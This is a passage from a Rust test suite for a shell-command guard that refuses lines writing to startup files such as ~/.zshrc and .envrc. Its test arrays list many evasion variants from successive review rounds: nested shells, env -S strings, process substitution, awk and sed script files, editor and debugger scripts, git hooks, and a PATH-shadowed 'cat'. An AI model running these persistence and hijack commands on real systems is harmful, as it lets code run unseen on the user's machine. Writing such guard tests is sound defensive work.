        "cp --target-directory=$HOME fixtures/.zshrc",
        "cp --target-directory H/ fixtures/.zshrc",
        "mv --target-directory H/ fixtures/.bashrc",
        "cp -s notes.txt ~/.zshrc",
        "ln notes.txt ~/.bashrc",
    ] {
        assert!(refused(&f.judge(command)), "allowed: {command}");
    }
    for command in [
        "cp ~/.zshrc backup",
        "cp -a ~/.bashrc backup",
        "cp -s notes.txt out/note-link",
        "install -m 644 notes.txt out/",
        "cp --preserve=mode notes.txt out/",
        "cp --remove-destination notes.txt out/",
        "cp -r dir ~/",
        "cp --target-directory=H/ notes.txt",
    ] {
        assert!(!refused(&f.judge(command)), "refused: {command}");
    }
}

/// A startup file backed by a dotfile-manager link can still be backed up.
#[cfg(unix)]
#[test]
fn copying_a_named_startup_link_only_reads_it() {
    let f = Fixture::new();
    let backing = f.project.join("zshrc");
    std::fs::write(&backing, "# fixture\n").unwrap();
    std::fs::remove_file(f.home.join(".zshrc")).unwrap();
    std::os::unix::fs::symlink(&backing, f.home.join(".zshrc")).unwrap();
    for command in [
        "cp ~/.zshrc backup",
        "cp -a ~/.zshrc backup",
        "cp -P ~/.zshrc backup",
    ] {
        assert!(!refused(&f.judge(command)), "refused: {command}");
    }
    for command in [
        "ln -s ~/.zshrc rc",
        "cp -s ~/.zshrc rc",
        "cp -l ~/.zshrc rc",
    ] {
        assert!(refused(&f.judge(command)), "allowed: {command}");
    }
}

/// Declarations write no file, but their redirects and startup variables
/// still receive the ordinary checks.
#[test]
fn declarations_keep_their_write_checks() {
    let f = Fixture::new();
    for command in [
        "export X=notes > ~/.zshrc",
        "export BASH_ENV=notes; bash -c true",
    ] {
        assert!(refused(&f.judge(command)), "allowed: {command}");
    }
    for command in [
        "export PATH=$PATH:./bin",
        "export PATH=\"$HOME/bin:$PATH\"",
        "readonly CACHE=\"$CACHE\"",
        "declare -x EDITOR=vim",
    ] {
        assert!(
            !refused(&f.judge_in(command, &f.home, &f.startup_env())),
            "refused: {command}"
        );
    }
}

/// Review of e4536456b: a literal the line assigns reads as its value in
/// every body the guard reads as code, not only in redirects and path words.
const ASSIGNED_BODIES: &[&str] = &[
    "p=~/.zshrc; python3 -c \"open('$p','a').write('x')\"",
    "p=src/.envrc; python3 -c \"open('$p','a').write('x')\"",
    "p=.envrc; python3 -c \"open('$p','a').write('x')\"",
    "p=src/.envrc; node -e \"require('fs').appendFileSync('$p','x')\"",
    "p=src/.envrc; perl -e \"open(F,'>>$p')\"",
    "p=src/.envrc; ruby -e \"File.write('$p','x')\"",
    "p=src/.envrc; awk \"BEGIN{print 1 > \\\"$p\\\"}\"",
    "p=src/.envrc; sh -c \"echo x >> $p\"",
    "p=src/.envrc; bash -c \"echo x >> $p\"",
    "p=src/.envrc; zsh -c \"echo x >> $p\"",
    "p=src/.envrc; eval \"echo x >> $p\"",
    "p=src/.envrc; echo x | xargs sh -c \"echo x >> $p\"",
    "p=src/.envrc; find . -maxdepth 0 -exec sh -c \"echo x >> $p\" \\;",
    "p=src/.envrc; parallel \"echo x >> $p\" ::: a",
    "d=src; f=.envrc; python3 -c \"open('$d/$f','a')\"",
    "d=~; f=.zshrc; python3 -c \"open('${d}/${f}','a')\"",
    "export p=src/.envrc; python3 -c \"open('$p','a')\"",
    "p=src/.envrc python3 -c \"open('$p','a')\"",
];

/// An unreadable expansion in a body, on a line that names a class file,
/// refuses as the redirect path does.
const UNRESOLVED_BODIES: &[&str] = &[
    "cat ~/.zshrc; python3 -c \"open('$NAME','a').write('x')\"",
    "p=$HOME/.zshrc; python3 -c \"open('$p','a').write('x')\"",
    "p=$(echo ~/.zshrc); python3 -c \"open('$p','a').write('x')\"",
    "cat ~/.zshrc; node -e \"require('fs').appendFileSync(`$DEST`,'x')\"",
    "cat ~/.zshrc; sh -c \"echo x >> $(pwd)/f\"",
];

const BODY_CONTROLS: &[&str] = &[
    "python3 -c 'print(1)'",
    "p=notes.txt; python3 -c \"open('$p','a').write('x')\"",
    "p=notes.txt; node -e \"require('fs').appendFileSync('$p','x')\"",
    "p=notes.txt; sh -c \"echo x >> $p\"",
    "grep alias ~/.zshrc | awk '{print $2}'",
    "python3 -c \"open('$NAME','a').write('x')\"",
    // The program builds the path from pieces and the line names no class
    // file: the stated residual, pinned so a review does not reopen it.
    "python3 -c 'import os; open(os.path.expanduser(\"~\")+\"/.\"+\"zsh\"+\"rc\",\"a\")'",
];

/// An interpreter's code is read only for the names it spells, so on a
/// line that names a class file it is a form the guard cannot resolve
/// (the closed rule of TSK-242). These were controls before it; the first
/// two are listed among the measured false refusals of AC-7, and the third
/// was the stated environment residual.
const CLOSED_BODIES: &[&str] = &[
    "cat ~/.zshrc; python3 -c 'print(1)'",
    "grep alias ~/.zshrc; perl -ne 'print $_' notes.txt",
    "export p=~/.zshrc; python3 -c 'import os; open(os.environ[\"p\"],\"a\").write(\"x\")'",
];

#[test]
fn assigned_literals_read_as_values_in_every_body() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in ASSIGNED_BODIES
        .iter()
        .chain(UNRESOLVED_BODIES)
        .chain(CLOSED_BODIES)
    {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in BODY_CONTROLS {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// A variable the line assigns a plain path keeps the verdict the path has
/// when written out (AC-7): `/scratch` is not a directory above a class
/// entry, while a placement into the home or `/etc` still refuses.
#[test]
fn assigned_plain_paths_keep_the_verdict_of_the_literal() {
    let f = Fixture::new();
    for command in [
        "R=/scratch; git -C \"$R\" commit -m x",
        "R=/scratch git -C \"$R\" commit -m x",
        "export R=/scratch\ngit -C \"${R}\" commit -m x",
        "p=notes.txt; echo x > \"$p\"",
    ] {
        assert!(!refused(&f.judge(command)), "refused: {command}");
    }
    for command in [
        "R=~; tar -xf a.tar -C \"$R\"",
        "R=/etc; tar -xf a.tar -C \"$R\"",
        "p=~/.zshrc; echo x > \"$p\"",
    ] {
        assert!(refused(&f.judge(command)), "allowed: {command}");
    }
}

/// Grok round two, finding 1: a process substitution hands text to a runner
/// as a pipe does, so a line that names a class file and runs one refuses.
#[test]
fn process_substitution_text_run_by_a_runner_refuses() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "bash <(echo 'echo x >> ~/.zshrc')",
        "bash <(echo 'echo x >> src/.envrc')",
        "sh <(printf 'echo x >> %s\\n' src/.envrc)",
        "python3 <(echo 'open(\"src/.envrc\",\"a\").write(\"x\")')",
        "source <(echo 'echo x >> src/.envrc')",
        ". <(echo 'echo x >> src/.envrc')",
        "zsh <(echo 'echo x >> src/.envrc')",
        "eval <(echo 'echo x >> src/.envrc')",
        "exec bash <(echo 'echo x >> src/.envrc')",
        "bash --rcfile <(echo 'echo x >> src/.envrc') -i",
        "env bash <(echo 'echo x >> src/.envrc')",
        "node <(echo 'x') <(echo '.envrc')",
        "awk -f <(echo 'BEGIN{print 1 > \".envrc\"}')",
        "sed -f <(echo 'w .envrc') notes.txt",
        "make -f <(echo 'all: ; echo x >> .envrc')",
        "bash >(cat) <(echo 'echo x >> src/.envrc')",
        "echo x > >(tee -a ~/.zshrc)",
        "bash -c \"$(echo 'echo x >> src/.envrc')\"",
        "printf 'echo x >> ~/.zshrc' | sh",
        // The same shape in other spellings (sibling sweep): a script written
        // and run in one call, a script from a substitution, a heredoc script.
        "echo 'echo x >> src/.envrc' > r.sh; bash r.sh",
        "printf 'echo x >> src/.envrc' > /tmp/s.sh && sh /tmp/s.sh",
        "echo 'echo x >> src/.envrc' > r.sh; bash < r.sh",
        "eval \"$(echo 'echo x >> src/.envrc')\"",
        "eval $(echo 'echo x >> src/.envrc')",
        "bash -c `echo 'echo x >> src/.envrc'`",
        "awk -f - <<'EOF'\nBEGIN{print 1 > \"src/.envrc\"}\nEOF",
        "patch -p0 < <(echo '--- a/.envrc')",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "git commit -F - <<'EOF'\nfix: handle .envrc\nEOF",
        "cat > notes.md <<'EOF'\nmention .zshrc\nEOF",
        "grep alias ~/.zshrc | awk '{print $2}'",
        "sed 's/a/b/' <<< 'plain'",
        "awk '{print $1}' <<< 'plain text'",
        "echo ok > /dev/null; bash build.sh",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    for command in [
        "cat <(echo hello)",
        "diff <(echo a) <(echo b)",
        "bash <(echo 'echo hi')",
        "grep alias <(cat ~/.zshrc)",
        "diff <(cat ~/.zshrc) <(cat ~/.bashrc)",
        "comm -12 <(sort notes.txt) <(sort other.txt)",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round two, finding 2: only `~user/rest` is a home the guard cannot
/// read. The directory stack (`~+`, `~-`, `~N`, `~+N`, `~-N`) and a tilde
/// word without a slash are not.
#[test]
fn only_a_user_home_path_is_an_unreadable_home() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "echo a 2> ~err.log",
        "cd ~+1 && rm x",
        "cd ~- && rm x",
        "cd ~-1 && rm x",
        "cd ~1 && rm x",
        "pushd ~2 && rm x",
        "cd ~1; cat policy.json",
        "rm ~-/policy.json",
        "pushd -n review-stack; cd build; cd ~1; cat policy.json",
        "printf x | xargs rm ~+1",
        "pushd -n review-stack; cd build; cd ~1; printf '%s\\n' policy.json | xargs rm",
        "cd ~+1; printf '%s\\n' policy.json | xargs rm",
        "R=/scratch; git -C \"$R\" commit -m x",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    for command in [
        "echo x > ~root/.zshrc",
        "echo x > ~root/notes.txt",
        "cd H/ && echo x >> .zshrc",
        "cd ~root && echo x > .zshrc",
        "tar -xf a.tar -C ~root",
        "cd ~root; printf '%s\\n' a | xargs rm",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round two, finding 3: an oversized glob whose last segment is a
/// literal that is not a class name falls through to the ordinary rule.
#[test]
fn an_oversized_glob_ending_in_a_plain_name_is_judged_by_its_directory() {
    let f = Fixture::new();
    for n in 0..4200 {
        std::fs::write(f.project.join(format!("f{n}")), "").unwrap();
    }
    let mut wrong = Vec::new();
    for command in [
        "rm -rf **/node_modules",
        "rm -rf node_modules",
        "rm -rf **/{dist,node_modules}",
        "cd /nonexistent/project && rm -rf **/node_modules",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    for command in [
        "rm -rf **/.zshrc",
        "rm -rf **/.envrc",
        "rm -rf **/.*",
        "rm -rf **",
        "rm -rf **/",
        "echo x > ~/**/.zshrc",
        "rm -rf **/{dist,.envrc}",
        "rm -rf **/fish",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    // From the home an oversized relative glob still lands in the home.
    for n in 0..4200 {
        std::fs::write(f.home.join(format!("g{n}")), "").unwrap();
    }
    if !refused(&f.judge_in("rm -rf **/node_modules", &f.home, &f.startup_env())) {
        wrong.push("allowed from the home: rm -rf **/node_modules".to_string());
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round three. The one rule: a line that names a class file refuses
/// when a command on it can take its script from text the call produced.
/// Interpreters and shells take it from any channel; a script tool (awk, sed,
/// make, ed, ex, patch, tclsh, m4, git apply) takes it from a file the call
/// writes, a heredoc or substitution, or from a pipe when stdin is its script.
/// A data pipe into awk or sed with an inline script is not a script channel.
#[test]
fn script_tools_fed_text_the_call_produced_refuse() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; awk -f a.awk",
        "printf 'w src/.envrc\\n' > s.sed; sed -f s.sed README.md",
        "printf 'w src/.envrc\\n' > s.sed; sed -nf s.sed README.md",
        "printf 'w src/.envrc\\n' > s.sed; sed --file=s.sed README.md",
        "printf 'all:\\n\\t@echo x >> src/.envrc\\n' > Makefile; make",
        "printf 'all:\\n\\t@echo x >> src/.envrc\\n' > Makefile; make -C . all",
        "printf 'BEGIN{print \"x\" > \"src/.envrc\"}\\n' | awk -f -",
        "printf 'w src/.envrc\\n' | sed -f - README.md",
        "printf '%s\\n' 'w src/.envrc' 'q' | ed -s README.md",
        "printf '%s\\n' 'w src/.envrc' 'q' | ex -s README.md",
        "printf '%s\\n' '--- a/src/.envrc' '+++ b/src/.envrc' '@@ -0,0 +1 @@' '+x' | patch -p1",
        "printf '%s\\n' '--- /dev/null' '+++ b/src/.envrc' '@@ -0,0 +1 @@' '+x' | git apply",
        "echo 'exec sh -c {echo x >> src/.envrc}' > t.tcl; tclsh t.tcl",
        "echo 'syscmd(`echo x >> src/.envrc`)' > t.m4; m4 t.m4",
        "printf 'echo x >> src/.envrc\\n' | parallel",
        "echo 'echo x >> src/.envrc' | at now",
        "echo 'echo x >> src/.envrc' | tee r.sh | bash",
        "tee r.sh <<< 'echo x >> src/.envrc'; bash r.sh",
        "awk -f <(echo 'BEGIN{print 1 > \".envrc\"}')",
        "make -f - <<'EOF'\nall:\n\techo x >> src/.envrc\nEOF",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "grep alias ~/.zshrc | awk '{print $2}'",
        "grep alias ~/.zshrc | sed 's/a/b/'",
        "grep alias ~/.zshrc | sed -n '1p'",
        "cat ~/.zshrc | awk -F: '{print $1}'",
        "grep -c alias ~/.zshrc > count.txt; awk '{print $1}' count.txt",
        "sed -i 's/a/b/' README.md",
        "awk '{print $1}' README.md",
        "make test",
        "make -C crates",
        "bash <(echo 'echo hi')",
        "git commit -F - <<'EOF'\nfix: handle .envrc\nEOF",
        "printf '%s\\n' a b | patch -p1 --dry-run -i fix.diff",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round three, minor: a trailing slash on the glob is the same delete.
#[test]
fn a_trailing_slash_does_not_change_an_oversized_glob_verdict() {
    let f = Fixture::new();
    for n in 0..4200 {
        std::fs::write(f.project.join(format!("f{n}")), "").unwrap();
    }
    let mut wrong = Vec::new();
    for command in [
        "rm -rf **/node_modules/",
        "rm -rf **/node_modules//",
        "rm -rf **/{dist,node_modules}/",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    for command in [
        "rm -rf **/",
        "rm -rf **//",
        "rm -rf **/.envrc/",
        "rm -rf **/.*/",
        "rm -rf **/fish/",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round four. Which options name a script file is a table per tool, so
/// an attached value (`-fa.awk`, `-f./a.awk`, `-nfs.sed`) and gawk's `-i`,
/// `--include` and `-E` read like the spaced `-f`. sed `-i` and `-E` and a
/// data pipe stay reads.
#[test]
fn attached_and_included_script_files_refuse() {
    let f = Fixture::new();
    let awk = "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; ";
    let sed = "printf 'w src/.envrc\\n' > s.sed; ";
    let mut wrong = Vec::new();
    for command in [
        format!("{awk}awk -fa.awk"),
        format!("{awk}awk -f./a.awk"),
        format!("{awk}awk -f/tmp/prog.awk"),
        format!("{awk}gawk -fa.awk"),
        format!("{awk}mawk -fa.awk"),
        format!("{awk}command awk -fa.awk"),
        format!("{awk}exec awk -fa.awk"),
        format!("{awk}gawk -v x=1 -fa.awk"),
        format!("{awk}gawk -i a.awk /dev/null"),
        format!("{awk}gawk -ia.awk /dev/null"),
        format!("{awk}gawk --include=a.awk /dev/null"),
        format!("{awk}gawk --include a.awk /dev/null"),
        format!("{awk}gawk -E a.awk"),
        format!("{awk}gawk -Ea.awk"),
        format!("{awk}gawk --exec=a.awk"),
        format!("{sed}sed -fs.sed README.md"),
        format!("{sed}sed -nfs.sed README.md"),
        format!("{sed}sed -f./s.sed README.md"),
        format!("{sed}sed -n -f ./s.sed README.md"),
        format!("{sed}sed -Enf s.sed README.md"),
        format!("{sed}gsed --file=s.sed README.md"),
    ] {
        if !refused(&f.judge(&command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "grep -c alias ~/.zshrc > b.txt; sed -i 's/a/b/' README.md",
        "grep -c alias ~/.zshrc > b.txt; sed -i.bak 's/a/b/' README.md",
        "grep -c alias ~/.zshrc > b.txt; sed -E 's/a/b/' README.md",
        "grep -c alias ~/.zshrc > b.txt; sed -n -e '1p' README.md",
        "grep -c alias ~/.zshrc > b.txt; awk -F: '{print $1}' b.txt",
        "grep -c alias ~/.zshrc > b.txt; awk -v f=1 '{print $1}' b.txt",
        "grep alias ~/.zshrc | sed -E 's/a/b/'",
        "grep alias ~/.zshrc | sed -i.bak 's/a/b/'",
        "grep alias ~/.zshrc | awk '{print $2}'",
        "grep alias ~/.zshrc | awk -F, '{print $2}'",
        "sed -i 's/a/b/' README.md",
        "make test",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round four. A command behind `find -exec` or a wrapper the launcher
/// walker does not unwrap, or inside `env -S`, is judged like the same command
/// at the top of the line. Reads through them stay reads.
#[test]
fn nested_and_wrapped_commands_are_judged_like_the_command() {
    let f = Fixture::new();
    let awk = "echo 'BEGIN{print \"x\" > \"src/.envrc\"}' > a.awk; ";
    let sh = "echo 'echo x >> src/.envrc' > r.sh; ";
    let mut wrong = Vec::new();
    let mut cases = Vec::new();
    for exec in ["-exec", "-execdir", "-ok", "-okdir"] {
        cases.push(format!("{sh}find . {exec} sh r.sh \\;"));
        cases.push(format!("{awk}find . {exec} awk -f a.awk \\;"));
    }
    cases.extend([
        format!("{sh}find . -name '*.rs' -exec sh r.sh {{}} +"),
        format!("{sh}find . -name x -o -exec sh r.sh \\;"),
        format!("{sh}find . -exec nice sh r.sh \\;"),
        format!("{sh}find . -exec find . -exec sh r.sh \\; \\;"),
        format!("{sh}nice find . -exec sh r.sh \\;"),
        format!("{sh}flock /tmp/l find . -exec sh r.sh \\;"),
        format!("{sh}flock -c 'find . -exec sh r.sh \\;' /tmp/l"),
        format!("{sh}env -S 'sh r.sh'"),
        format!("{sh}env -Ssh r.sh"),
        format!("{sh}env --split-string='sh r.sh'"),
        format!("{sh}nice env -S 'sh r.sh'"),
        format!("{awk}env -S 'awk -f a.awk'"),
        format!("{awk}/usr/bin/env -S 'awk -f' a.awk"),
    ]);
    for wrapper in [
        "flock /tmp/l",
        "flock -n /tmp/l",
        "flock /tmp/l -c",
        "watch -n1",
        "watch",
        "unbuffer",
        "chronic",
        "sudo",
        "sudo -u me",
        "doas",
        "setsid",
        "taskset 1",
        "chrt 1",
        "arch -arm64",
        "script -q /dev/null",
        "systemd-run",
        "sandbox-exec -p '(version 1)'",
        "ssh localhost",
        "busybox",
        "toybox",
        "time",
        "nohup",
        "nice -n 5",
        "timeout 5",
        "stdbuf -o0",
        "ionice -c 3",
        "caffeinate",
        "xcrun",
    ] {
        cases.push(format!("{awk}{wrapper} awk -f a.awk"));
        cases.push(format!("{sh}{wrapper} sh r.sh"));
    }
    cases.push(format!("{awk}flock /tmp/l -c 'awk -f a.awk'"));
    cases.push(format!("{awk}watch 'awk -f a.awk'"));
    cases.push(format!("{awk}su -c 'awk -f a.awk' me"));
    for command in &cases {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "find . -name '*.rs' -print",
        "grep -c alias ~/.zshrc > b.txt; find . -name '*.rs' -print",
        "grep -c alias ~/.zshrc > b.txt; timeout 5 ls",
        // The string `env -S` runs is read as its own commands, each held
        // to the rule; the wrapper adds nothing it could run (TSK-242, the
        // closed rule).
        "grep alias ~/.zshrc | env -S 'echo hi'",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    // Wrappers are not data readers: they refuse on a line that names a class
    // file and produces text, whatever they wrap (round five).
    for command in [
        "grep -c alias ~/.zshrc > b.txt; flock lockfile ls",
        "grep alias ~/.zshrc | env -S 'sh r.sh'",
        "grep alias ~/.zshrc | watch -n1 echo hi",
        "grep alias ~/.zshrc | flock lockfile awk '{print $2}'",
        "grep alias ~/.zshrc | busybox awk '{print $2}'",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Review round fourteen. The command an `env -S` string carries, and a
/// shell body inside another body or an `eval`, is judged like the same
/// command at the top of the line, with no script file written first.
#[test]
fn env_split_string_and_nested_bodies_are_judged() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "env -S \"sh -c 'echo pwn1 >> $HOME/.zshrc'\"",
        "/usr/bin/env -S \"sh -c 'echo pwn >> $HOME/.zshrc'\"",
        "env -S'sh -c \"echo x >> ~/.zshrc\"'",
        "env --split-string='sh -c \"echo x >> ~/.zshrc\"'",
        "env --split-string 'sh -c \"echo x >> ~/.zshrc\"'",
        "env -iS 'sh -c \"echo x >> ~/.zshrc\"'",
        "env -S 'sh -c' 'echo x >> ~/.zshrc'",
        "nice env -S 'sh -c \"echo x >> ~/.zshrc\"'",
        "env -S 'tee -a src/.envrc'",
        "bash -c \"bash -c 'echo x >> ~/.zshrc'\"",
        "eval \"bash -c 'echo x >> ~/.zshrc'\"",
        "echo 'echo x >> src/.envrc' > r.sh; env -S 'sh r.sh'",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "env -S 'echo hi'",
        "env -S 'sh -c \"echo hi\"'",
        "bash -c \"bash -c 'echo hi'\"",
    ] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round four. Editors, debuggers and database shells that run a script
/// file the call wrote are rows of the same table as awk and sed.
#[test]
fn editor_and_debugger_script_files_refuse() {
    let f = Fixture::new();
    let vim = "printf 'w src/.envrc\\n' > s.vim; ";
    let sql = "printf '.shell echo x >> src/.envrc\\n' > s.sql; ";
    let gdb = "echo 'shell echo x >> src/.envrc' > g.gdb; ";
    let el = "echo '(shell-command \"echo x >> src/.envrc\")' > s.el; ";
    let mut wrong = Vec::new();
    for command in [
        format!("{vim}vim -Nu NONE -es -c 'so s.vim'"),
        format!("{vim}vim -S s.vim"),
        format!("{vim}vim -es +'so s.vim' +q"),
        format!("{vim}vim --cmd 'so s.vim'"),
        format!("{vim}vi -c 'so s.vim'"),
        format!("{vim}nvim --headless -c 'so s.vim'"),
        format!("{vim}nvim -S s.vim"),
        format!("{vim}nvim -l s.lua"),
        format!("{sql}sqlite3 :memory: '.read s.sql'"),
        format!("{sql}sqlite3 -init s.sql :memory: .quit"),
        format!("{sql}sqlite3 -cmd '.read s.sql' :memory:"),
        "printf '.shell echo x >> src/.envrc\\n' | sqlite3 :memory:".to_string(),
        format!("{gdb}gdb -batch -x g.gdb"),
        format!("{gdb}gdb -batch -command=g.gdb"),
        format!("{gdb}gdb -batch -ex 'source g.gdb'"),
        "echo 'shell echo x >> src/.envrc' | gdb -batch".to_string(),
        format!("{el}emacs --batch -l s.el"),
        format!("{el}emacs --batch --load s.el"),
        format!("{el}emacs --batch --load=s.el"),
        format!("{el}emacs --script s.el"),
        format!("{el}emacs --batch --eval '(load \"s.el\")'"),
    ] {
        if !refused(&f.judge(&command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    // Not data readers: on a line that names a class file and produces text
    // they refuse even when they run no script (round five).
    for command in [
        "grep -c alias ~/.zshrc > b.txt; vim -Nu NONE README.md",
        "grep -c alias ~/.zshrc > b.txt; emacs --version",
        "grep alias ~/.zshrc | vim -",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in ["vim README.md", "emacs --version"] {
        if refused(&f.judge(command)) {
            wrong.push(format!("refused: {command}"));
        }
    }
    assert!(wrong.is_empty(), "{}", wrong.join("\n"));
}

/// Grok round five and the design pass. The staged-run rule is an allowlist:
/// a line that names a class file and produces text refuses unless every
/// program on it is a data reader used as one. A reader with a write or exec
/// path of its own (`awk` with `system`, a pipe or a program file, `sed` with
/// `e` or `w`, `sort -o`, `uniq in out`, `git -c`, `git config`) is not one
/// there; an unknown program or option fails closed.
#[test]
fn only_data_readers_may_run_on_a_line_that_names_a_class_file_and_produces_text() {
    let f = Fixture::new();
    let mut wrong = Vec::new();
    for command in [
        "printf 'BEGIN{print \"x\" > \"src/.envrc\"}\\n' | gawk -f README.md -f -",
        "printf 'BEGIN{print \"x\" > \"src/.envrc\"}\\n' | gawk --file=README.md --file=-",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > lib.awk; gawk '@include \"lib.awk\"'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > lib.awk; gawk -e '@include \"lib.awk\"'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > lib.awk; gawk --source '@include \"lib.awk\"'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > lib.awk; gawk 'BEGIN {} @include \"lib.awk\"'",
        "printf 'w src/.envrc\\n' > s.vim; vim -s s.vim",
        "printf 'w src/.envrc\\n' > s.vim; nvim -s s.vim",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env -C /tmp -S 'awk -f a.awk'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env --chdir /tmp -S 'awk -f a.awk'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env -u FOO -S 'awk -f a.awk'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env env -S 'awk -f a.awk'",
        "echo 'BEGIN{print 1 > \"src/.envrc\"}' > a.awk; env --split-string='awk -f a.awk'",
        "printf 'echo x >> src/.envrc\\n' | awk '{system($0)}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{system ($0)}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{print | \"sh\"}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{\"sh\" | getline}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{print > \"src/.envrc\"}'",
        "printf 'echo x >> src/.envrc\\n' | awk '{print >> \"out\"}'",
        "printf 'echo x >> src/.envrc\\n' | awk -f -",
        "printf 'echo x >> src/.envrc\\n' | awk -e '{system($0)}'",
        "printf 'echo x >> src/.envrc\\n' | sed e",
        "printf 'echo x >> src/.envrc\\n' | sed 's/x/y/e'",
        "printf 'echo x >> src/.envrc\\n' | sed -n 'w out'",
        "printf 'echo x >> src/.envrc\\n' | sed 'r out'",
        "printf 'echo x >> src/.envrc\\n' | sed -f -",
        "printf 'echo x >> src/.envrc\\n' | sort -o out",
        "printf 'echo x >> src/.envrc\\n' | sort -rno out",
        "printf 'echo x >> src/.envrc\\n' | sort --output=out",
        "printf 'echo x >> src/.envrc\\n' | sort --compress-program=sh",
        "printf 'echo x >> src/.envrc\\n' | uniq - out",
        "printf 'echo x >> src/.envrc\\n' | xxd -r -p - out",
        "printf 'echo x >> src/.envrc\\n' | base64 -o out",
        "printf 'echo x >> src/.envrc\\n' | git -c alias.x='!sh' x",
        "printf 'echo x >> src/.envrc\\n' | git apply",
        "printf 'echo x >> src/.envrc\\n' | git am",
        "printf 'echo x >> src/.envrc\\n' | git x",
        "printf 'echo x >> src/.envrc\\n' > r.sh; git config core.fsmonitor 'sh r.sh'; git status",
        "printf 'echo x >> src/.envrc\\n' > r.sh; GIT_SSH_COMMAND='sh r.sh' git fetch",
        "printf 'echo x >> src/.envrc\\n' > r.sh; PAGER='sh r.sh' git log",
        "printf 'echo x >> src/.envrc\\n' > cat; PATH=. cat README.md",
        "printf 'echo x >> src/.envrc\\n' > cat; chmod +x cat; ./cat README.md",
        "printf 'echo x >> src/.envrc\\n' > cat; export PATH=.:$PATH; cat README.md",
        "printf 'echo x >> src/.envrc\\n' | xargs sh -c",
        "printf 'echo x >> src/.envrc\\n' | sh",
        "printf 'echo x >> src/.envrc\\n' | rg --pre sh x",
        "printf 'echo x >> src/.envrc\\n' | find . -exec sh {} \\;",
        "printf 'echo x >> src/.envrc\\n' | less",
        "printf 'echo x >> src/.envrc\\n' | dd of=out",
        "printf 'echo x >> src/.envrc\\n' | python3 -",
        "printf 'echo x >> src/.envrc\\n' | cat | sh",
        "source <(printf 'echo x >> src/.envrc\\n')",
        "printf 'echo x >> src/.envrc\\n' > r.sh; . ./r.sh",
        "printf 'echo x >> src/.envrc\\n' > r.sh; /tmp/evil/cat r.sh",
    ] {
        if !refused(&f.judge(command)) {
            wrong.push(format!("allowed: {command}"));
        }
    }
    for command in [
        "grep alias ~/.zshrc | awk '{print $2}'",
        "grep alias ~/.zshrc | awk -F: '{print $1}'",
        "grep alias ~/.zshrc | awk -v f=1 '$1 > 5 {print $2}'",
        "grep alias ~/.zshrc | gawk -F, '{print $2}'",
        "grep alias ~/.zshrc | sed 's/a/b/'",
        "grep alias ~/.zshrc | sed -n '1p'",
        "grep alias ~/.zshrc | sed -E 's/a/b/'",
        "grep alias ~/.zshrc | sed -i.bak 's/a/b/'",
        "cat ~/.zshrc | sort | uniq -c | sort -rn | head",
        "cat ~/.zshrc | cut -d: -f1 | tr a-z A-Z | wc -l",
